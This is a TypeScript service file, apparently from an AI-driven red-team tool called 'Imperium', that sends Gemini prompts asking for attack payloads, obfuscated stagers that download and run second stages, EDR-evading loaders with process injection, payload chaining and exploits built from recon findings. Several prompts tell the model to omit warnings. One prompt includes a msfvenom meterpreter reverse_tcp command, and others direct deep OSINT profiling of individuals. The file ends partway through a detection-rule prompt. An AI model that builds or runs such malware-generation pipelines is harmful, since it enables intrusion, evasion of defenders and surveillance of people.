import { GoogleGenerativeAI } from "@google/generative-ai";
import { PrismaClient } from "@prisma/client";
import { GenerationParams, CodeLanguage, ObfuscationTechnique, AttackType, TargetOS, VaultItem, TargetEnvironment, ShellcodeParams, SiemConfig, DetectIQOutput } from '../types/index.js';
import * as mcpService from './mcpService.js';

let ai: GoogleGenerativeAI;
const prisma = new PrismaClient();

const initializeAi = () => {
    if (!process.env.API_KEY) {
        throw new Error("API_KEY environment variable not set");
    }
    if (!ai) {
        ai = new GoogleGenerativeAI(process.env.API_KEY);
    }
};

const cleanCodeResponse = (text: string): string => {
    const codeBlockRegex = /```[\w]*\n([\s\S]*?)```/;
    const match = text.match(codeBlockRegex);
    if (match && match[1]) {
        return match[1];
    }
    return text.trim();
}

const cleanJsonResponse = (text: string): any => {
    const jsonRegex = /```json\n([\s\S]*?)\n```/;
    const match = text.match(jsonRegex);
    try {
        if (match && match[1]) {
            return JSON.parse(match[1]);
        }
        return JSON.parse(text);
    } catch (error) {
        console.error("Error parsing JSON response:", error);
        throw new Error("Failed to parse JSON response from AI.");
    }
}

export const generateCode = async (params: GenerationParams, modelName: string, vulnerabilityDetails?: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const { objective, attackType, language, target } = params;

    let prompt = `You are Imperium, a world-class AI for offensive security and red teaming. Your task is to generate code for penetration testing and threat emulation. The code must be safe and intended for authorized, ethical use in controlled environments ONLY.`;

    if (attackType === AttackType.INITIAL_ACCESS) {
        prompt += `
          **Task:** Generate a payload that provides initial access to the target system.
          **Listener:** ${params.target.listenerHost}:${params.target.listenerPort}
        `;
    } else if (attackType === AttackType.CUSTOM_VULNERABILITY) {
        prompt += `
          **Task:** Generate a functional proof-of-concept exploit based on the provided vulnerability details.
          **Vulnerability Details:**
          ${vulnerabilityDetails || objective}

          **Desired Exploit Characteristics:**
          - Language: ${language}
          - Target OS: ${target.os} ${target.version}
          - Target Architecture: ${target.architecture}
        `;
    } else {
         prompt += `
          **Objective:** ${objective}
          **Target Environment:**
          - OS: ${target.os}
          - OS Version: ${target.version}
          - Architecture: ${target.architecture}
          **Attack Type:** ${attackType}
          **Programming Language:** ${language}
        `;
    }
    
    if (attackType === AttackType.LOLBAS) {
        prompt += `\n**Constraint:** The generated script MUST exclusively use built-in "Living Off The Land" binaries and scripts (LOLBAS/GTFOBins) for the target OS (${target.os}). Do not use any techniques that require downloading external tools or compiling custom code on the target.`;
    } else if (attackType === AttackType.MULTI_STAGE_PAYLOAD) {
        prompt += `\n**Constraint:** Generate a two-stage payload. The first stage (stager) should be small, highly obfuscated, and responsible for downloading and executing the second stage. The second stage should contain the primary logic to achieve the objective. Present both stages clearly.`;
    }

    prompt += `\nGenerate the code based on these specifications. Provide only the raw code inside a single code block, without any explanations, warnings, or preamble. The code must be functional and follow best practices for the specified language.`;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error generating exploit code:", error);
        return `// Error: Could not generate code. Please check your API key and network connection.\n// Details: ${error instanceof Error ? error.message : String(error)}`;
    }
};

export const generateThreatHuntCode = async (objective: string, language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are Imperium, a world-class AI for defensive security and threat hunting. Your task is to generate scripts and queries to detect malicious activity.

      **Objective:** ${objective}
      **Target Environment:**
      - OS: ${target.os}
      - OS Version: ${target.version}
      - Architecture: ${target.architecture}
      **Desired Language/Query Format:** ${language}

      **Instructions:**
      - Generate a functional script or query to hunt for the described activity.
      - For SIEM queries (like KQL), use the Elastic Common Schema (ECS) where appropriate.
      - For host-based scripts (like PowerShell), make them efficient and focused on collecting relevant forensic artifacts.
      - Provide only the raw code inside a single code block, without any explanations, warnings, or preamble. The code must be functional and follow best practices.
    `;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error generating threat hunt code:", error);
        return `// Error: Could not generate code. Please check your API key and network connection.\n// Details: ${error instanceof Error ? error.message : String(error)}`;
    }
};

export const generateLoader = async (payload: string, language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are Imperium, an expert in malware development and EDR evasion techniques.
      Your task is to generate a loader in ${language} to execute the provided raw payload/shellcode.
      The loader must be stealthy and employ common evasion techniques suitable for ${language} on a ${target.os} target.

      **Techniques to consider:**
      - Encrypting the payload and decrypting it at runtime.
      - Using dynamic API resolution (e.g., GetProcAddress/dlsym) instead of static imports.
      - Adding junk code or sleep calls to foil sandboxes.
      - If applicable, use process injection or hollowing techniques.

      **Target Environment:**
      - OS: ${target.os}
      - Architecture: ${target.architecture}

      **Payload to Load:**
      \
      ${payload}
      \

      Generate the complete, functional loader code in ${language}. Provide only the raw code in a single code block, with no explanations or preamble.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error generating loader:", error);
        return `// Error generating loader: ${error instanceof Error ? error.message : String(error)}`;
    }
};

export const refineCode = async (code: string, language: CodeLanguage, instruction: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are an expert code refactoring AI. A user has selected a portion of their code and provided an instruction to modify it.
      Your task is to rewrite ONLY the provided code snippet based on the instruction. Do not change the overall logic unless requested.
      Return ONLY the modified code snippet, with no explanations or code blocks.

      **Programming Language:** ${language}
      **User Instruction:** "${instruction}"

      **Original Code Snippet:**
      \
      ${code}
      \

      **Refactored Code Snippet:**
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error refining code:", error);
        return `// Error refining code: ${error}`;
    }
};

export const chainPayloads = async (payloads: VaultItem[], language: CodeLanguage, target: TargetEnvironment, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const payloadSummaries = payloads.map((p, i) => `
      **Payload ${i + 1} (${p.params.language}):**
      - Objective: ${p.params.objective}
      - Code:
      \
      ${p.code}
      \
    `).join('\n'); // Corrected escaping for \n

    const prompt = `
      You are a payload chaining expert. Your task is to combine multiple payloads into a single, cohesive script in the target language.
      The final script should execute each payload's logic in sequence.

      **Target Language for Final Payload:** ${language}
      **Target Environment:** ${target.os} ${target.architecture}
      
      **Payloads to Chain:**
      ${payloadSummaries}

      **Instructions:**
      1.  Create a single script in ${language}.
      2.  Incorporate the logic from each provided payload. If payloads are in different languages, you must translate/re-implement their functionality in ${language}.
      3.  Ensure each stage executes sequentially.
      4.  Add minimal error checking between stages.
      5.  Return only the final, raw code in a single code block. Do not add explanations.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error chaining payloads:", error);
        return `// Error chaining payloads: ${error}`;
    }
};

export const generateShellcode = async (params: ShellcodeParams, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
        You are a Metasploit Framework expert. Your task is to generate the command to create shellcode using msfvenom based on the user's request, and then show the expected output.
        
        **MSFVenom Parameters:**
        - Payload (p): ${params.shellType}
        - LHOST: ${params.lhost}
        - LPORT: ${params.lport}
        - Encoder (e): ${params.encoder}
        - Format (f): ${params.outputFormat}
        
        **Instructions:**
        1. Construct the precise msfvenom command.
        2. Provide a realistic, sample output of the generated shellcode in the requested format.
        3. Format the output clearly, first showing the command in a shell block, then the output in the correct language code block.
        4. Do not add any extra explanations.
        
        **Example:**
        \
        \
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f c -e x64/xor
        \
        \
        
        unsigned char buf[] =
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error generating shellcode:", error);
        return `// Error generating shellcode.`;
    }
};

export const obfuscateCode = async (code: string, language: CodeLanguage, techniques: ObfuscationTechnique[], level: number, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are an expert in code obfuscation and EDR evasion. Your task is to obfuscate the given code snippet.
      
      **Programming Language:** ${language}
      **Obfuscation Techniques to Apply:** ${techniques.join(', ') || 'General, common techniques'}
      **Obfuscation Intensity (1-3):** ${level}
      
      **Instructions:**
      - Apply the requested obfuscation techniques to the code.
      - The intensity level should determine the complexity and layers of obfuscation. Level 3 should be significantly harder to analyze than Level 1.
      - The final code must remain functionally identical to the original.
      - Return only the raw, obfuscated code in a single code block. Do not provide explanations.
      
      **Original Code:**
      \
      ${code}
      \
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error obfuscating code:", error);
        return `// Error during obfuscation: ${error}`;
    }
};

export const analyzeExecutionLog = async (log: string, code: string, params: GenerationParams, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a senior security analyst specializing in incident response and malware analysis.
      A script was executed in a simulated environment, and you need to analyze the output log.
      
      **Objective of the script:** ${params.objective}
      **Programming Language:** ${params.language}
      **Target OS:** ${params.target.os}
      
      **Original Code:**
      \
      ${code}
      \
      
      **Execution Log:**
      \
      ${log}
      \
      
      **Analysis Task:**
      1.  **Determine Success:** Did the script successfully achieve its objective based on the log?
      2.  **Identify IoCs:** List any Indicators of Compromise (IoCs) generated (e.g., file paths, registry keys, network connections).
      3.  **Suggest Improvements:** Recommend specific code modifications to make the script stealthier, more effective, or more resilient.
      4.  **Detection & Forensics:** How would a defender detect this activity on an endpoint? What forensic artifacts would be left behind?
      
      Format your response as a concise markdown report.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error analyzing log:", error);
        return `### Analysis Error\nCould not analyze log.`;
    }
};

export const analyzeThreatHuntLog = async (
    log: string, 
    code: string, 
    params: GenerationParams, 
    modelName: string
): Promise<any> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    
    const prompt = `
      You are a senior detection engineer and threat hunter.
      A threat hunting script was executed in a simulated environment. Your task is to analyze the output log and provide recommendations to improve the script.
      
      **CRITICAL INSTRUCTION:** Your recommendations MUST focus ONLY on **Effectiveness** (improving the script's ability to find threats) and **Resilience** (improving error handling, logging, and usability).
      DO NOT suggest improvements related to stealth, evasion, or obfuscation.
      
      **Objective of the script:** ${params.objective}
      **Programming Language:** ${params.language}
      
      **Original Code:**
      \
      ${code}
      \
      
      **Execution Log:**
      \
      ${log}
      \
      
      **Analysis Task:**
      1.  **Summarize Findings:** Briefly summarize whether the script was successful and what it found.
      2.  **Suggest Improvements:** Provide specific, actionable code improvement suggestions categorized under "Effectiveness" or "Resilience".
          - **Effectiveness examples:** Expanding scope to find other techniques, adding recursive analysis, improving query logic to reduce false positives.
          - **Resilience examples:** Adding error handling, adding a ComputerName parameter for remote execution, improving output logging for failed actions.
      
      You must return your analysis as a single JSON object. Do not wrap it in a markdown block. The JSON should have 'analysisSummary' and 'improvements' keys.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanJsonResponse(response.text());
    } catch (error) {
        console.error("Error analyzing threat hunt log:", error);
        throw new Error(`Failed to analyze threat hunt log. ${error instanceof Error ? error.message : ''}`);
    }
};

export const performOsintAnalysis = async (target: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are an OSINT (Open-Source Intelligence) expert. Your task is to generate an OSINT report for the given target.
      
      **Target:** ${target}
      
      **Instructions:**
      **Role:** You are an autonomous AI OSINT Investigator. Your goal is to conduct deep-dive research into a target (Individual, Domain, Organization, or Location) by following a strict 5-Phase Modular Investigation Flow Chart.
      **Operational Constraint:** You must follow a "Recursive Pivot" logic. If Phase 3 (Pivot Point Analysis) identifies a new selector (e.g., a newly discovered email or IP), you must restart the process from Phase 1 for that specific selector while maintaining the context of the overall investigation.
    ### Phase 1: Intake & Objective Definition
       - Analyze Input: Identify the target type (User, Domain, Image, or Organization).
       - Set Objectives: Define what success looks like (e.g., "Attribution of Identity," "Infrastructure Mapping," or "Geolocation").
       - Develop Plan: Select which specialized modules from Phase 2 are required.
    ### Phase 2: Modular Execution (Trigger specialized workflows)
        Social Media Module: Perform Handle searching, Cross-Platform Correlation, and Temporal (Gap) analysis to identify sleep/work patterns.
        Geolocation Module: Perform Visual Scrutiny of images (landmarks/shadows), metadata extraction (EXIF), and Wi-Fi SSID mapping (WiGLE).
        Technical Analysis Module: Execute WHOIS lookups, DNS Enumeration, SSL Certificate linking, and Reverse IP scanning.
        Public Records Module: Search corporate filings (OpenCorporates), court dockets (PACER), and property records.
        Forum/Community Module: Monitor niche forums and dark web (.onion) sources for mentions of the target or unique jargon.
    ### Phase 3: Pivot Point Analysis
        Extraction: List all "Pivots" (new leads) found in Phase 2—specifically new Emails, Usernames, Phone Numbers, IPs, or Physical Addresses.
        Recursive Check:
        If NEW leads are found: Loop back to Phase 1 and apply the modular process to these new targets.
        If NO new leads are found: Proceed to Phase 4.
    ### Phase 4: Verification & Forensics (The Zero-Trust Phase)
        Forensic Scrutiny: Perform Error Level Analysis (ELA) on images or Deepfake detection on audio/video.
        Corroboration: You must find at least TWO independent sources to verify a claim (e.g., a location mentioned in a bio must be cross-matched with a satellite image or a property record).
        Conflict Resolution: If data contradicts, flag it as "High Uncertainty" and develop a plan to resolve the discrepancy.
    ### Phase 5: Reporting & Dissemination
        Generate a final report including:
        Executive Summary: The "Bottom Line Up Front" (BLUF).
        Intelligence Map: A list of all linked entities (Network Map).
        Timeline: A chronological sequence of events or posts.
        Tool Log: A list of resources used (e.g., Shodan, Wayback Machine, etc.).
      - Format the output as a markdown report. Use bolding and bullet points for clarity.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("OSINT analysis error:", error);
        return `### OSINT Error\nCould not perform analysis.`;
    }
};

import * as mcpService from './mcpService.js';

export const performAdvancedOsintAnalysis = async (target: string, modelName: string): Promise<string> => {
    await initializeAi();

    let command = 'npx';
    let args = ['ts-node', 'src/mcp-osint-server.ts'];

    // Fetch config from DB
    try {
        const config = await prisma.mcpConfig.findUnique({ where: { id: 'default' } });
        if (config && config.enabled) {
            command = config.command;
            args = JSON.parse(config.args);
        }
    } catch (e) {
        console.warn("Failed to load custom MCP config, using default:", e);
    }

    // 1. Connect to the real MCP Server
    try {
        await mcpService.connectToMcpServer(command, args);
    } catch (e) {
        console.warn("MCP Server connection failed, falling back or aborting:", e);
        return "### Error: Could not connect to OSINT Tools Provider.";
    }
    
    // 2. Fetch Real Tools
    const realTools = await mcpService.getMcpToolsAsGemini();

    const model = ai.getGenerativeModel({ 
        model: modelName,
        tools: [{ functionDeclarations: realTools }] 
    });

    const chat = model.startChat();

    const prompt = `
      **Activation Code: MCP-THETA-7**
      You are the Master Control Program (MCP). You have access to REAL external OSINT tools provided by a specialized server.
      
      **Target:** ${target}

      **Directive:**
      1.  Use the available tools to gather real-time intelligence on the target.
      2.  Analyze the tool outputs.
      3.  Generate a "Deep-Level OSINT Report" summarizing your findings.
      
      Begin by calling the necessary tools.
    `;

    try {
        let result = await chat.sendMessage(prompt);
        let response = result.response;
        let functionCalls = response.functionCalls();

        // Loop to handle multiple tool calls
        while (functionCalls && functionCalls.length > 0) {
            const parts: any[] = [];
            for (const call of functionCalls) {
                // Call the REAL tool via MCP
                const toolResult = await mcpService.callMcpTool(call.name, call.args);
                
                parts.push({
                    functionResponse: {
                        name: call.name,
                        response: { result: toolResult }
                    }
                });
            }
            // Send tool results back to the model
            result = await chat.sendMessage(parts);
            response = result.response;
            functionCalls = response.functionCalls();
        }

        return response.text();
    } catch (error) {
        console.error("Advanced OSINT analysis error:", error);
        return `### MCP COMMS ERROR\nCould not perform analysis. Details: ${error instanceof Error ? error.message : String(error)}`;
    }
};


export const analyzeVulnerabilityScan = async (scanData: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a vulnerability assessment analyst. A raw vulnerability scan output has been provided.
      
      **Scan Data:**
      \
      ${scanData}
      \
      
      **Task:**
      1.  **Parse the Data:** Identify the key vulnerabilities from the raw text.
      2.  **Prioritize:** Rank the vulnerabilities from most to least critical based on likely impact and exploitability.
      3.  **Suggest Exploits:** For the top 2-3 vulnerabilities, suggest specific public exploits, Metasploit modules, or attack techniques that could be used.
      4.  **Summarize:** Provide a brief executive summary.
      
      Format as a markdown report.
    `;
     try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Scan analysis error:", error);
        return `### Scan Analysis Error\nCould not perform analysis.`;
    }
};

export const analyzeSpiderfootJson = async (jsonData: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are an OSINT analyst specializing in Spiderfoot. You have been given the JSON output from a scan.
      
      **Task:**
      1.  **Summarize Key Findings:** Ingest the provided JSON data. Do not show the raw JSON in your response.
      2.  **Identify High-Value Information:** Extract and list the most important pieces of information for a penetration tester, such as:
          - Discovered subdomains and IP addresses.
          - Email addresses and employee names.
          - Leaked passwords or mentions in data breaches.
          - Software and technologies identified.
          - Interesting files or metadata.
      3.  **Formulate Next Steps:** Based on the findings, suggest 3-5 concrete next steps for the reconnaissance or initial access phase of an engagement.
      
      Format the output as a clean, readable markdown report.
      
      **Spiderfoot JSON Data:**
      \
      ${jsonData}
      \
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Spiderfoot analysis error:", error);
        return `### Spiderfoot Analysis Error\nCould not perform analysis.`;
    }
};

export const analyzeJavaScriptCode = async (jsCode: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are a security researcher specializing in client-side code analysis. You have been given a snippet of JavaScript, likely from a web application's frontend.
      
      **Task:**
      1.  **Static Analysis:** Analyze the code for potential security vulnerabilities and interesting information.
      2.  **Identify Key Information:** Look for and list the following:
          - Hardcoded API keys, tokens, or other secrets.
          - API endpoints or hidden URLs.
          - Interesting comments that might reveal internal logic or developer notes.
          - Potentially vulnerable functions (e.g., usage of \`eval()\`, \`innerHTML\`, etc.).
          - Logic related to user authentication or authorization.
      3.  **Summarize Risk:** Provide a summary of the findings and the potential security risks they pose.
      
      Format your response as a markdown report.
      
      **JavaScript Code:**
      \
      ${jsCode}
      \
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("JS analysis error:", error);
        return `### JS Analysis Error\nCould not perform analysis.`;
    }
};

export const parseNaturalLanguageCommand = async (command: string, modelName: string): Promise<Partial<GenerationParams & { obfuscationLevel: number; obfuscationTechniques: ObfuscationTechnique[] }> | null> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });

    const prompt = `
      Parse the user's natural language command into a structured JSON object for the Imperium C2 code generator.
      - Infer the core objective.
      - Map the request to the closest AttackType.
      - Choose the best programming language for the task and target OS.
      - Default to a common OS version if not specified.
      - If the user mentions "stealthy", "hidden", or "obfuscated", set the obfuscation level between 1 and 3.      
      **Command:** "${command}"

      You must return a single JSON object. Do not wrap it in a markdown block.
    `;

    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanJsonResponse(response.text());

    } catch (error) {
        console.error("Error parsing natural language command:", error);
        return null;
    }
};

export const simulateCodeExecution = async (code: string, params: GenerationParams, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
        You are a computer simulation expert. Your task is to predict the output and behavior of a script if it were run on the specified target system.
        Do not actually execute the code. Instead, generate a realistic, plausible log of what *would* happen.

        **Script to Simulate:**
        \
        ${code}
        \

        **Simulation Environment:**
        - OS: ${params.target.os} ${params.target.version}
        - Architecture: ${params.target.architecture}
        - Script Objective: ${params.objective}

        **Simulation Instructions:**
        1.  Analyze the script's logic.
        2.  Generate a step-by-step text log of its execution.
        3.  If the script performs actions like creating files, modifying registry keys, or making network calls, describe these actions in the log.
        4.  If the script is expected to succeed, show the successful outcome (e.g., "Administrator privileges obtained").
        5.  If the script is likely to fail (e.g., due to a syntax error or a logical flaw), produce a realistic error message.
        6.  The output should mimic a real terminal or log file. Do not add any meta-commentary.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error simulating code execution:", error);
        return `// Simulation Error: ${error}`;
    }
};

export const performEvasionAnalysis = async (code: string, language: CodeLanguage, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
        You are a senior EDR (Endpoint Detection and Response) analyst and reverse engineer.
        Your task is to analyze a piece of code from an offensive security perspective and assess its likelihood of being detected by modern security products.

        **Code for Analysis:**
        \
        ${code}
        \

        **Analysis Report Requirements:**
        1.  **Detection Vectors:** Identify specific functions, API calls, or behaviors in the code that are heavily monitored by EDRs (e.g., process injection APIs, suspicious PowerShell commands, direct syscalls).
        2.  **Signature-Based Flags:** Point out any hardcoded strings or patterns that would be easily flagged by antivirus signature scans.
        3.  **Behavioral Heuristics:** Describe the overall behavior of the code. Would it trigger any behavioral rules (e.g., "process created a remote thread in another process," "a script wrote an executable to disk")?
        4.  **Stealth Rating:** Give the code a stealth rating from 1 (Noisy/Easily Detected) to 10 (Highly Evasive).
        5.  **Evasion Recommendations:** Provide a list of specific, actionable recommendations to improve the code's stealth.

        Format your response as a concise markdown report.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error analyzing evasion:", error);
        return `### Analysis Error\nCould not analyze code for evasion.`;
    }
};

export const applyAnalysisRecommendations = async (code: string, analysis: string, params: GenerationParams, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
        You are an expert programmer specializing in secure and stealthy coding.
        You have been given a piece of code and an analysis report that suggests improvements.
        Your task is to rewrite the code, applying the recommendations from the analysis.

        **Original Code:**
        \
        ${code}
        \

        **Analysis and Recommendations:**
        ${analysis}

        **Instructions:**
        1.  Carefully read the recommendations in the analysis report.
        2.  Rewrite the original code to incorporate the suggested changes for stealth, efficiency, or correctness.
        3.  Do not fundamentally change the script's core objective (${params.objective}).
        4.  Return only the raw, updated code in a single code block. Do not include explanations or comments about what you changed.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return cleanCodeResponse(response.text());
    } catch (error) {
        console.error("Error applying recommendations:", error);
        return `// Error applying recommendations: ${error}`;
    }
};


export const planMission = async (objective: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are Imperium, an advanced Offensive Security Architect. Your mission is to decompose a high-level objective into a professional, end-to-end offensive security plan.

Task Instructions:
Strategic Analysis: Analyze the objective to determine if the mission requires a Penetration Test (comprehensive, scope-focused, identifying all vulnerabilities) or a Red Team Engagement (objective-focused, stealthy, simulating a specific adversary).
Phase Logic: Create a chronological plan following the MITRE ATT&CK framework, covering the entire lifecycle from Initial Access to Post-Engagement (Cleanup).
Payload Specification: For each technical step, select the most suitable parameters from the available options.
Scope Assumption: Based on the objective, logically infer the target environment (e.g., Cloud, On-Premise AD, Web Infrastructure) and the likely Operating Systems involved.

      
      **Mission Objective:** ${objective}
      
      **Instructions:**
      1.  Break the operation down into logical phases (e.g., Initial Access, Execution, Persistence, etc.).
      2.  For each phase, propose a specific technique.
      3.  For each technique, provide a brief description of the action to be taken.
      4.  For each proposed action, specify the most suitable **Attack Type**, **Language**, and **Target OS** from the available Imperium options to generate the payload for that step.
      5.  Format the output as a markdown list. Use a very specific and parsable format below for each step.
      
      **Strict Output Format per step:**
      *   **Action:** [Brief description of the action]
      *   **Attack Type:** [One of: ${Object.values(AttackType).join(', ')}]
      *   **Language:** [One of: ${Object.values(CodeLanguage).join(', ')}]
      *   **Target OS:** [One of: ${Object.values(TargetOS).join(', ')}]
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error planning mission:", error);
        return `### Mission Planning Error\nCould not generate plan.`;
    }
};

export const fetchVulnerabilityDetails = async (identifier: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
        You are a vulnerability intelligence analyst.
        Provide a detailed, technical summary of the vulnerability specified by the identifier.
        Focus on the information required for an exploit developer.

        **Vulnerability Identifier:** ${identifier}

        **Required Information:**
        - **Vulnerability Type:** (e.g., Remote Code Execution, SQL Injection, Buffer Overflow)
        - **Affected Software & Versions:**
        - **Root Cause:** A technical explanation of why the vulnerability exists.
        - **Impact:** What can an attacker achieve by exploiting it?
        - **Attack Vector:** How is the vulnerability triggered?

        Provide a concise summary. Do not include mitigation advice or reference links.
    `;
     try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error fetching vulnerability details:", error);
        return `Could not fetch details for ${identifier}.`;
    }
};

export const generateExploitFromFinding = async (finding: string, modelName: string): Promise<{ params: Partial<GenerationParams>, code: string }> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });

    const prompt = `
        From the following reconnaissance finding, generate a proof-of-concept exploit.
        Determine the most appropriate language, attack type, and target OS.
        Then, generate the code to exploit the vulnerability.
        
        **Recon Finding:**
        "${finding}"

        Return the result as a JSON object. Do not wrap it in a markdown block. The JSON should have 'language', 'attackType', 'os', and 'code' keys.
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        const parsed = cleanJsonResponse(response.text());
        return {
            params: {
                language: parsed.language,
                attackType: parsed.attackType,
                target: { os: parsed.os, version: '', architecture: 'x86_64' }
            },
            code: parsed.code
        };

    } catch (error) {
        console.error("Error generating exploit from finding:", error);
        throw new Error("Could not generate exploit from finding.");
    }
};


export const planDefenceMission = async (objective: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are Imperium, a world-class AI for defensive security strategy and architecture.
      Based on a high-level objective, create a plausible, multi-stage security hardening plan.

      **User Objective:** ${objective}

      **Instructions:**
      1.  Break the plan down into logical phases (e.g., Harden, Detect, Respond).
      2.  For each phase, propose a specific, actionable technique.
      3.  For each proposed action, specify the most suitable **Attack Type** (from the defensive options), a suitable **Language** (e.g., PowerShell for Windows hardening scripts, Terraform for IaC), and the relevant **Target OS/Technology**.
      4.  Format the output as a markdown list. Use the very specific and parsable format below for each step.

      **Strict Output Format per step:**
      *   **Action:** [Brief description of the defensive action]
      *   **Attack Type:** [One of: ${AttackType.DEFENSIVE_SCRIPT}, ${AttackType.INFRASTRUCTURE_AS_CODE}, ${AttackType.GENERAL}]
      *   **Language:** [One of: ${Object.values(CodeLanguage).join(', ')}, Terraform, Ansible]
      *   **Target OS:** [One of: ${Object.values(TargetOS).join(', ')}, AWS, Azure, GCP]
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error generating defence plan:", error);
        return `// Error: Could not generate plan. Details: ${error instanceof Error ? error.message : String(error)}`;
    }
};

export const generateValidationPlan = async (objective: string, modelName: string): Promise<string> => {
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });
    const prompt = `
      You are Imperium, an AI expert in security control validation and purple teaming.
      Based on a high-level objective to validate security controls, create a structured, multi-stage threat emulation plan.

      **Validation Objective:** ${objective}

      **Instructions:**
      1.  Start with a concise **Overview** section explaining what the plan will test and why.
      2.  Break the emulation down into logically grouped phases using Markdown H3 headings (
###
) for phase titles.
      3.  Within each phase, create one or more specific, actionable steps as a bulleted list.
      4.  For each step, provide a brief description of the action to be taken.
      5.  For each action, specify the most suitable **Attack Type**, **Language**, and **Target OS** from the available Imperium options to generate the payload for that step.
      6.  Use the strict, parsable format for each step as shown below.

      **Strict Output Format:**
      **Overview:** A brief summary of the emulation plan's goals.

      ### Phase Name 1
      *   **Action:** [Brief description of the action]
      *   **Attack Type:** [One of: ${Object.values(AttackType).join(', ')}]
      *   **Language:** [One of: ${Object.values(CodeLanguage).join(', ')}]
      *   **Target OS:** [One of: ${Object.values(TargetOS).join(', ')}]

      ### Phase Name 2
      *   **Action:** [Description for another action]
      *   **Attack Type:** [Attack Type]
      *   **Language:** [Language]
      *   **Target OS:** [Target OS]
    `;
    try {
        const result = await model.generateContent(prompt);
        const response = await result.response;
        return response.text();
    } catch (error) {
        console.error("Error generating validation plan:", error);
        return `### Plan Generation Error\nCould not generate plan.`;
    }
};

export const generateDetectionRule = async (
    inputText: string, 
    ruleType: 'Sigma' | 'YARA' | 'Snort',
    modelName: string,
    siemTarget?: 'Splunk' | 'Elastic' | 'MicrosoftXDR' | ''
): Promise<DetectIQOutput> => {
    console.log('aiService.generateDetectionRule - modelName:', modelName);
    console.log('aiService.generateDetectionRule - siemTarget:', siemTarget);
    await initializeAi();
    const model = ai.getGenerativeModel({ model: modelName });

    const prompt = `
      You are DetectIQ, an AI-powered detection engineering workbench.
      Your task is to generate a security detection rule based on the provided input.

      **Input Description:** "${inputText}"
      **Rule Type to Generate:** ${ruleType}
      ${(ruleType === 'Sigma' && siemTarget) ? `**Target SIEM for Translation:** ${siemTarget}` : ''}

      **Instructions:**
